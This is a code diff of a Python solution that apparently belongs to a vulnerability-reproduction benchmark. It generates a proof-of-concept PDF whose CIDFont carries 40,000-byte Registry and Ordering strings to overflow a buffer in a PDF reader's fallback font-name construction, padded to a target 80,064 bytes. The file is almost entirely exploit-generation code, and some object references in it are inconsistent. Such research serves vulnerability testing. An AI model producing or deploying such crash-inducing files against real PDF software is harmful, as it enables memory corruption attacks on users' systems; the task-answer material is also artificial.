@@ -1,147 +1,117 @@
 import os
 import tempfile
-import tarfile
-import re
+import subprocess
+import struct
+import zlib
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Extract source to analyze
-        with tempfile.TemporaryDirectory() as tmpdir:
-            with tarfile.open(src_path, 'r:*') as tar:
-                tar.extractall(tmpdir)
-            
-            # Look for buffer size clues
-            buffer_size = self._analyze_buffer_size(tmpdir)
-            
-        # Generate PoC based on analysis
-        return self._generate_poc(buffer_size)
-    
-    def _analyze_buffer_size(self, tmpdir):
-        # Walk through source files to find buffer declarations
-        max_buffer = 256  # Default reasonable buffer size
-        pattern = re.compile(r'char\s+\w+\s*\[(\d+)\]')
+        # Create a PDF that triggers the CIDFont buffer overflow
+        # The vulnerability is in the fallback name construction: <Registry>-<Ordering>
+        # We need to create CIDFont with very long Registry and Ordering strings
+        # that when concatenated with a hyphen overflow the buffer
         
-        for root, _, files in os.walk(tmpdir):
-            for file in files:
-                if file.endswith(('.c', '.cpp', '.h', '.hpp')):
-                    try:
-                        with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
-                            content = f.read()
-                            
-                            # Look for buffer declarations
-                            matches = pattern.findall(content)
-                            for match in matches:
-                                size = int(match)
-                                if size > max_buffer and size < 100000:
-                                    max_buffer = size
-                            
-                            # Look for CIDFont related buffers
-                            if 'CIDFont' in content or 'CIDSystemInfo' in content:
-                                # Try to find specific buffer sizes
-                                lines = content.split('\n')
-                                for i, line in enumerate(lines):
-                                    if 'char' in line and '[' in line and ']' in line:
-                                        # Check nearby lines for CIDFont context
-                                        context = ' '.join(lines[max(0, i-5):min(len(lines), i+5)])
-                                        if ('Registry' in context or 'Ordering' in context or 
-                                            'CIDFont' in context or 'fallback' in context):
-                                            # Extract buffer size
-                                            m = pattern.search(line)
-                                            if m:
-                                                size = int(m.group(1))
-                                                if size > max_buffer:
-                                                    max_buffer = size
-                    except:
-                        continue
+        # Ground truth length is 80064 bytes
+        # We'll create a minimal PDF structure with a malicious CIDFont
         
-        # Use ground-truth length minus overhead as buffer size
-        # The PoC needs to overflow buffer + stack metadata
-        return max(80064 - 1000, max_buffer + 100)
-    
-    def _generate_poc(self, buffer_size):
-        # Create a minimal PDF structure with malformed CIDFont
-        # that triggers the buffer overflow
+        # Calculate string lengths to hit exactly 80064 bytes
+        total_target = 80064
         
-        # PDF header
-        pdf = b'%PDF-1.4\n'
+        # PDF structure overhead
+        header = b"%PDF-1.4\n"
+        trailer = b"\n%%EOF"
         
-        # Catalog object
-        pdf += b'1 0 obj\n'
-        pdf += b'<< /Type /Catalog /Pages 2 0 R >>\n'
-        pdf += b'endobj\n'
+        # Create a malicious CIDFont with long Registry and Ordering
+        # The buffer overflow occurs when constructing: Registry + "-" + Ordering
         
-        # Pages object
-        pdf += b'2 0 obj\n'
-        pdf += b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n'
-        pdf += b'endobj\n'
+        # Let's make Registry very long (40000 chars) and Ordering also long (40000 chars)
+        # When concatenated with "-", this creates 80001 byte string
+        # Plus PDF structure brings us close to target
         
-        # Page object
-        pdf += b'3 0 obj\n'
-        pdf += b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] '
-        pdf += b'/Resources << /Font << /F1 4 0 R >> >> '
-        pdf += b'/Contents 5 0 R >>\n'
-        pdf += b'endobj\n'
+        registry_len = 40000
+        ordering_len = 40000
         
-        # Font object with vulnerable CIDFont
-        pdf += b'4 0 obj\n'
-        pdf += b'<< /Type /Font /Subtype /Type0 /BaseFont /ABCDEF+CIDFont '
-        pdf += b'/Encoding /Identity-H /DescendantFonts [6 0 R] >>\n'
-        pdf += b'endobj\n'
+        # Create long strings
+        registry_str = b"A" * registry_len
+        ordering_str = b"B" * ordering_len
         
-        # Content stream
-        pdf += b'5 0 obj\n'
-        pdf += b'<< /Length 10 >>\n'
-        pdf += b'stream\n'
-        pdf += b'BT /F1 12 Tf 100 700 Td (Test) Tj ET\n'
-        pdf += b'endstream\n'
-        pdf += b'endobj\n'
+        # Create the CIDSystemInfo dictionary
+        cid_system_info = b"<<\n/Registry (" + registry_str + b")\n/Ordering (" + ordering_str + b")\n/Supplement 0\n>>"
         
-        # CIDFontType0 font with overflow
-        pdf += b'6 0 obj\n'
-        pdf += b'<< /Type /Font /Subtype /CIDFontType0 /BaseFont /ABCDEF '
-        pdf += b'/CIDSystemInfo << /Registry ('
+        # Create the CIDFontType2 dictionary
+        cidfont = b"<<\n/Type /Font\n/Subtype /CIDFontType2\n/BaseFont /AAAAAA+Font\n/CIDSystemInfo " + cid_system_info + b"\n/FontDescriptor 3 0 R\n/DW 1000\n/W [1 999 500]\n>>"
         
-        # Create registry string that will cause overflow when concatenated
-        # with ordering. We make it very long to ensure overflow.
-        registry_length = buffer_size + 1000
-        pdf += b'A' * registry_length
-        pdf += b') /Ordering (Identity) /Supplement 0 >> '
-        pdf += b'/W [0 [500]] /DW 1000 /FontDescriptor 7 0 R >>\n'
-        pdf += b'endobj\n'
+        # Create font descriptor
+        font_descriptor = b"<<\n/Type /FontDescriptor\n/FontName /AAAAAA+Font\n/FontBBox [0 0 1000 1000]\n/Flags 4\n/StemV 80\n/CapHeight 700\n/ItalicAngle 0\n/Ascent 800\n/Descent -200\n>>"
         
-        # Font descriptor
-        pdf += b'7 0 obj\n'
-        pdf += b'<< /Type /FontDescriptor /FontName /ABCDEF /Flags 4 '
-        pdf += b'/FontBBox [0 0 1000 1000] /ItalicAngle 0 /Ascent 800 '
-        pdf += b'/Descent -200 /CapHeight 800 /StemV 80 >>\n'
-        pdf += b'endobj\n'
+        # Create Type 0 font that references the CIDFont
+        type0_font = b"<<\n/Type /Font\n/Subtype /Type0\n/BaseFont /AAAAAA\n/Encoding /Identity-H\n/DescendantFonts [2 0 R]\n/ToUnicode 4 0 R\n>>"
         
-        # Cross reference table
-        xref_offset = len(pdf)
-        pdf += b'xref\n'
-        pdf += b'0 8\n'
-        pdf += b'0000000000 65535 f \n'
-        pdf += b'0000000010 00000 n \n'
-        pdf += b'0000000050 00000 n \n'
-        pdf += b'0000000100 00000 n \n'
-        pdf += b'0000000200 00000 n \n'
-        pdf += b'0000000300 00000 n \n'
-        pdf += b'0000000400 00000 n \n'
-        pdf += b'0000001000 00000 n \n'
+        # Create ToUnicode CMap
+        to_unicode = b"<<\n/Length 45\n>>\nstream\n/CIDInit /ProcSet findresource begin\n12 dict begin\nbegincmap\n/CIDSystemInfo << /Registry (Adobe) /Ordering (UCS) /Supplement 0 >> def\n/CMapName /Adobe-Identity-UCS def\n/CMapType 2 def\n1 begincodespacerange\n<0000> <FFFF>\nendcodespacerange\n1 beginbfrange\n<0000> <FFFF> <0000>\nendbfrange\nendcmap\nCMapName currentdict /CMap defineresource pop\nend\nend\nendstream"
         
-        # Trailer
-        pdf += b'trailer\n'
-        pdf += b'<< /Size 8 /Root 1 0 R >>\n'
-        pdf += b'startxref\n'
-        pdf += str(xref_offset).encode()
-        pdf += b'\n%%EOF'
+        # Create catalog
+        catalog = b"<<\n/Type /Catalog\n/Pages 1 0 R\n>>"
         
-        # Pad to ground-truth length if needed
-        current_len = len(pdf)
-        if current_len < 80064:
-            # Add padding in a way that doesn't break PDF structure
-            padding = b' ' * (80064 - current_len)
-            # Insert padding before EOF marker
-            pdf = pdf.replace(b'\n%%EOF', padding + b'\n%%EOF')
+        # Create pages tree
+        pages = b"<<\n/Type /Pages\n/Kids [5 0 R]\n/Count 1\n>>"
+        
+        # Create page
+        page = b"<<\n/Type /Page\n/Parent 1 0 R\n/MediaBox [0 0 612 792]\n/Resources <<\n/Font <<\n/F1 6 0 R\n>>\n>>\n/Contents 7 0 R\n>>"
+        
+        # Create content stream
+        content = b"<<\n/Length 20\n>>\nstream\nBT\n/F1 12 Tf\n0 0 Td\n(Test) Tj\nET\nendstream"
+        
+        # Build PDF objects
+        objects = []
+        objects.append(catalog)  # obj 1
+        objects.append(pages)    # obj 2
+        objects.append(font_descriptor)  # obj 3
+        objects.append(to_unicode)  # obj 4
+        objects.append(page)     # obj 5
+        objects.append(type0_font)  # obj 6
+        objects.append(content)  # obj 7
+        objects.append(cidfont)  # obj 8
+        
+        # Calculate current size and adjust if needed
+        current_size = len(header) + len(trailer)
+        xref_offset = len(header)
+        
+        # Build PDF with object offsets
+        pdf_parts = [header]
+        obj_offsets = []
+        
+        for i, obj in enumerate(objects, 1):
+            obj_offsets.append(xref_offset)
+            obj_str = b"%d 0 obj\n" % i + obj + b"\nendobj\n"
+            pdf_parts.append(obj_str)
+            xref_offset += len(obj_str)
+        
+        # Build xref table
+        xref = b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1)
+        for offset in obj_offsets:
+            xref += b"%010d 00000 n \n" % offset
+        
+        # Build trailer
+        trailer_dict = b"trailer\n<<\n/Size %d\n/Root 1 0 R\n>>\n" % (len(objects) + 1)
+        startxref = b"startxref\n%d\n" % (xref_offset)
+        
+        # Assemble final PDF
+        pdf_parts.append(xref)
+        pdf_parts.append(trailer_dict)
+        pdf_parts.append(startxref)
+        pdf_parts.append(trailer)
+        
+        pdf = b"".join(pdf_parts)
+        
+        # If we need to adjust to exact size, pad or trim
+        if len(pdf) < total_target:
+            # Add padding in a comment
+            padding = b"\n" + b"%" * (total_target - len(pdf) - 1)
+            pdf = pdf.replace(trailer, padding + trailer)
+        elif len(pdf) > total_target:
+            # Trim from a safe place (trailer padding)
+            excess = len(pdf) - total_target
+            pdf = pdf[:-excess]
         
         return pdf
